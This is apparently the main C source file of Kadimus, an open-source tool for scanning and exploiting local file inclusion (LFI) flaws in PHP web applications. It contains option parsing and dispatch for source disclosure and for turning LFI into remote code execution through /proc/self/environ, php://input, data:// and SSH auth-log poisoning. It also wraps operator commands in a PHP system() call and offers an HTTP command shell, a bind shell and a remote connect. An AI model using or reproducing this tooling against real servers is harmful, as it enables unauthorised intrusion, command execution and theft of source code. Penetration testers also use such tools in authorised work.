#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "kadimus.h"

#include "kadimus_str.h"
#include "memory/alloc.h"
#include "kadimus_request.h"
#include "kadimus_xpl.h"
#include "kadimus_regex.h"
#include "kadimus_socket.h"
#include "kadimus_io.h"
#include "globals.h"
#include "output.h"


static const struct option long_options[] = {
    {"help", no_argument, 0, 'h'},

    {"cookie", required_argument, 0, 'B'},
    {"user-agent", required_argument, 0, 'A'},
    {"connect-timeout", required_argument, 0, 0},
    {"retry-times", required_argument, 0, 0},
    {"proxy", required_argument, 0, 0},

    {"url", required_argument, 0, 'u'},
    {"url-list", required_argument, 0, 'U'},
    {"output", required_argument, 0, 'o'},
    {"threads", required_argument, 0, 't'},

    {"parameter", required_argument, 0, 0},

    {"technique", required_argument, 0, 'T'},
    {"code", required_argument, 0, 'C'},
    {"cmd", required_argument, 0, 'c'},
    {"shell", no_argument, 0, 's'},

    {"connect", required_argument, 0, 0},
    {"port", required_argument, 0, 'p'},
    {"listen", required_argument, 0, 'l'},

    {"ssh-port", required_argument, 0, 0},
    {"ssh-target", required_argument, 0, 0},

    {"get-source", no_argument, 0, 'S'},
    {"filename", required_argument, 0, 'f'},

    {0, 0, 0, 0}
};

void parser_opts(int argc, char **argv, struct kadimus_opts *opts){
    char *optname;
    int optc, option_index = 0;
    int tmp = 0;

    memset(opts, 0x0, sizeof(struct kadimus_opts));
    opts->connection_timeout = 10;
    opts->retry = 5;

    while((optc = getopt_long(argc, argv, OPTS, long_options, &option_index)) != -1){
        switch(optc){
            case 0:
                optname = (char *) long_options[option_index].name;

                if(!strcmp(optname, "connect-timeout")){
                    tmp = (int) strtol(optarg, NULL, 10);
                    if(tmp < 0)
                        die("--connect-timeout error: value must be between bigger than -1\n");
                    else
                        opts->connection_timeout = (long)tmp;
                }

                else if(!strcmp(optname, "retry-times")){
                    tmp = (int) strtol(optarg, NULL, 10);
                    if(tmp < 0)
                        die("--retry-times error: value must be between bigger than -1\n");
                    else
                        opts->retry = tmp;
                }

                else if(!strcmp(optname, "proxy")){
                    if(regex_match(PROXY_REGEX, optarg, 0, 0))
                        opts->proxy = optarg;
                    else
                        die("--proxy invalid syntax\n");
                }

                else if(!strcmp(optname, "connect")){
                    if(valid_ip_hostname(optarg))
                        opts->connect = optarg;
                    else
                        die("--connect error: Invalid IP/hostname\n");
                }

                else if(!strcmp(optname, "parameter")){
                    opts->parameter = optarg;
                }

                else if(!strcmp(optname, "ssh-port")){
                    tmp = (int) strtol(optarg, NULL, 10);
                    if(!IN_RANGE(tmp, 1, 65535))
                        die("--ssh-port error: set a valide port (1 .. 65535)\n");
                    else
                        opts->ssh_port = tmp;
                }

                else if(!strcmp(optname, "ssh-target")){
                    if(valid_ip_hostname(optarg))
                        opts->ssh_target = optarg;
                    else
                        die("--ssh-target error: invalid ip/hostname\n");
                }
            break;

            case 'h':
                help();
            break;

            case 'B':
                opts->cookies = optarg;
            break;

            case 'A':
                opts->useragent = optarg;
            break;

            case 'u':
                if(regex_match(URL_REGEX, optarg, 0, 0))
                    opts->url = optarg;
                else
                    die("-u, --url URL Have invalid syntax\n");
            break;

            case 'U':
                opts->list = xfopen(optarg,"r");
            break;

            case 'o':
                opts->output = xfopen(optarg,"a");
                setlinebuf(output);
            break;

            case 't':
                opts->threads = strtol(optarg, NULL, 10);
                if(opts->threads < 2)
                    die("--threads error: set a valide value (>= 2)\n");
            break;

            case 'T':
                if(!strcmp("environ", optarg))
                    tmp = ENVIRON;
                else if(!strcmp("auth", optarg))
                    tmp = AUTH;
                else if (!strcmp("input", optarg))
                    tmp = INPUT;
                else if (!strcmp("data", optarg))
                    tmp = DATA;
                else
                    die("-T, --technique invalid\n");

                opts->technique = tmp;
            break;

            case 'C':
                if(regex_match("^\\s*?\\<\\?.+\\?\\>\\s*?$", optarg, 0, PCRE_DOTALL))
                    opts->phpcode = optarg;
                else
                    die("-C, --code parameter must contain php brackets\n");
            break;

            case 'c':
                opts->cmd = optarg;
            break;

            case 's':
                opts->shell = 1;
            break;

            case 'p':
                tmp = (int) strtol(optarg, NULL, 10);
                if(!IN_RANGE(tmp, 1, 65535))
                    die("-p, --port error: set a valide port (1 .. 65535)\n");
                else
                    opts->port = tmp;
            break;

            case 'l':
                opts->listen = 1;
            break;

            case 'S':
                opts->get_source = 1;
            break;

            case 'f':
                opts->remote_filename = optarg;
            break;

            case 'O':
                opts->source_output = xfopen(optarg,"a");
            break;


            default:
                exit(EXIT_FAILURE);
        }
    }

    if(!opts->url && !opts->list)
        die("kadimus: try 'kadimus -h' or 'kadimus --help' for display help\n");

    if(opts->get_source){
        if(!opts->url)
            die("error: -S, --get-source requires -u\n");
        if(!opts->remote_filename)
            die("error: -S, --get-source requires -f\n");
        if(!opts->parameter)
            die("error: -S, --get-source requires --parameter\n");
    }

    if(opts->shell){
        if(!opts->url)
            die("error: -s, --shell requires -u\n");
        if(!opts->technique)
            die("error: -s, --shell requires -T\n");
    }

    if(opts->listen){
        if(!opts->port)
            die("error: -l, --listen requires -p\n");
    }

    if(opts->connect){
        if(!opts->port)
            die("error: --connect requires -p\n");
    }

    if(opts->phpcode){
        if(!opts->url)
            die("error: -C, --code requires -u\n");
        if(!opts->technique)
            die("error: -C, --code requires -T\n");
    }

    if(opts->cmd){
        if(!opts->url)
            die("error: -c, --cmd requires -u\n");
        if(!opts->technique)
            die("error: -c, --cmd requires -T\n");
    }

    if(opts->technique == DATA && !opts->parameter){
        die("error: -T data requires --parameter\n");
    }

    if(opts->technique == AUTH && !opts->ssh_target){
        die("error: -T auth requires --ssh-target\n");
    }

    if(!opts->get_source && !opts->shell && !opts->cmd && !opts->phpcode){
        opts->scan = 1;
        opts->technique = 0;
    }

}

void banner(void){
    static const char banner_msg[]=
        " _  __         _ _                     \n"
        "| |/ /__ _  __| (_)_ __ ___  _   _ ___ \n"
        "| ' // _` |/ _` | | '_ ` _ \\| | | / __|\n"
        "| . \\ (_| | (_| | | | | | | | |_| \\__ \\\n"
        "|_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/\n"
        "\n"
        "  v" VERSION " - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)\n";

    puts(banner_msg);
}

void help(void){
    static const char help_msg[]=
        "Options:\n"
        "  -h, --help                    Display this help menu\n\n"

        "  Request:\n"
        "    -B, --cookie STRING         Set custom HTTP Cookie header\n"
        "    -A, --user-agent STRING     User-Agent to send to server\n"
        "    --connect-timeout SECONDS   Maximum time allowed for connection\n"
        "    --retry-times NUMBER        number of times to retry if connection fails\n"
        "    --proxy STRING              Proxy to connect, syntax: protocol://hostname:port\n\n"

        "  Scanner:\n"
        "    -u, --url STRING            URL to scan/exploit\n"
        "    -U, --url-list FILE         File contains url list to scan\n"
        "    -o, --output FILE           File to save output results\n"
        "    -t, -threads NUMBER         Number of threads\n\n"

        "  Explotation:\n"
        "    --parameter STRING          Parameter name to inject exploit\n"
        "                                (only needed by RCE data and source disclosure)\n\n"

        "  RCE:\n"
        "    -T, --technique=TECH        LFI to RCE technique to use\n"
        "    -C, --code STRING           Custom PHP code to execute, with php brackets\n"
        "    -c, --cmd STRING            Execute system command on vulnerable target system\n"
        "    -s, --shell                 Simple command shell interface through HTTP Request\n\n"

        "    --connect STRING            Ip/Hostname to connect\n"
        "    -p, --port NUMBER           Port number to connect or listen\n"
        "    -l, --listen                Bind and listen for incoming connections\n\n"

        "    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)\n"
        "    --ssh-target STRING         Set the SSH Host\n\n"

        "    RCE Available techniques\n\n"

        "      environ                   Try run PHP Code using /proc/self/environ\n"
        "      input                     Try run PHP Code using php://input\n"
        "      auth                      Try run PHP Code using /var/log/auth.log\n"
        "      data                      Try run PHP Code using data://text\n\n"

        "    Source Disclosure:\n"
        "      -S, --get-source          Try get the source file using filter://\n"
        "      -f, --filename STRING     Set filename to grab source [REQUIRED]\n"
        "      -O FILE                   Set output file (Default: stdout)\n";

    puts(help_msg);
    exit(EXIT_SUCCESS);
}

void init_global_structs(struct kadimus_opts *opts){
    curl_global_init(CURL_GLOBAL_ALL);
    srand(time(NULL));

    global.useragent = opts->useragent;
    global.cookies = opts->cookies;
    global.proxy = opts->proxy;
    global.timeout = opts->connection_timeout;
    global.retry = opts->retry;

    output = opts->output;
    thread_enable = opts->threads;
}

int kadimus(struct kadimus_opts *opts){
    pid_t pid;
    char *cmd;

    if(opts->scan && opts->url)
        scan(opts->url);

    if(opts->list)
        scan_list(opts);

    if(opts->get_source)
        source_disclosure_get(opts->url, opts->remote_filename,
            opts->parameter, opts->source_output);

    if(opts->technique == AUTH){
        info("checking /var/log/auth.log poison ...\n");
        if(check_auth_poison(opts->url)){
            good("ok\n");
        } else {
            info("error, trying inject code in log file ...\n");
            if(ssh_log_poison(opts->ssh_target, opts->ssh_port)){
                info("log injection done, checking file ...\n");
                if(check_auth_poison(opts->url)){
                    good("injection sucessfull\n");
                } else {
                    error("error\n");
                    exit(1);
                }
            } else {
                error("error\n");
                exit(1);
            }
        }
    }


    if(opts->shell)
        rce_http_shell(opts->url, opts->parameter, opts->technique);



    if(opts->listen){
        pid = fork();
        if(pid == 0){
            start_bind_shell(opts->port);
            exit(0);
        } else if(pid == -1){
            xdie("fork() failed\n");
        }
        //sleep(1);
    }

    if(opts->phpcode)
        exec_phpcode(opts->url, opts->parameter, opts->phpcode, opts->technique);


    if(opts->cmd){
        xmalloc(cmd, strlen(opts->cmd)+21);
        sprintf(cmd, "<?php system(\"%s\"); ?>", opts->cmd);
        exec_phpcode(opts->url, opts->parameter, cmd, opts->technique);
        free(cmd);
    }

    if(opts->connect){
        remote_connect(opts->connect, opts->port, opts->proxy);
    }

    if(opts->listen)
        wait(NULL);

    if(opts->output)
        fclose(opts->output);

    return 0;
}

int main(int argc, char **argv){
    banner();

    struct kadimus_opts options;
    parser_opts(argc, argv, &options);

    /* init global structs */
    init_global_structs(&options);

    /* start */
    return kadimus(&options);
}
